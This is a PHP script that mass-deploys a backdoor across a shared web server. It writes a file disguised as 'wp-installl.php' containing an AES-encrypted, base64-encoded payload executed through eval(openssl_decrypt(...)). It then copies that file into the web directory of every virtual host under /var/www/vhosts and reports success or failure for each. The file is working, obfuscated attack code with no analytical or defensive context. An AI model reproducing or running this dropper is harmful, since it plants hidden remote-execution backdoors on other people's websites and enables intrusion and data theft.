<?php
error_reporting(0);

$root = '/var/www/vhosts';
$scan = scandir($root);

$nama = 'wp-installl.php'; // ganti nama file
$isi = <<<EOL
<?php
// SPLIT&ENCRYPTed
eval(openssl_decrypt(
	base64_decode('MkpdInsY4lvkxjsx9i+Wy3LkTbClmKdeVqDDWj+qRcDGzZoXrnGgBp1ZaGrSlp3icoRnQvO5AW4hVp2IQt+cwjIky/Z2YKaecJVmxfrtVRkMxo7bCMXcE/6CVuKuBQIFrqmdugZMEP/UJVq78OMBfuchBgD8ELHLDnyDq4WMipMBQmOEbkiECzjZd7f2u7yEGu5xmBIT5RZImc5UoCqsy/xbLstRaUoNgLklOhLE4m0='),
	'AES-256-CBC',
	base64_decode('WZRHGrsBESr8wYFZ9sx0tPURuZgG2lmzyvWpwXPKz8U='),
	OPENSSL_RAW_DATA,
	base64_decode('0qayFOFCwXvX8nIV8LOUiw==')
));
EOL;

$bikin = fopen($nama, "w");
		 fwrite($bikin, $isi);
		 fclose($bikin);

foreach ( $scan as $a ) {
	$dir = "$a \n";
	$gas = $root.'/'.$a.'/web/'.$nama;
	$cos = "$gas \n";
	$asu = @copy($nama, $gas);
	if($asu) {
		print 'Done! => '.$cos; }
			else { print 'Failed! => '.$dir; }
	}
?>
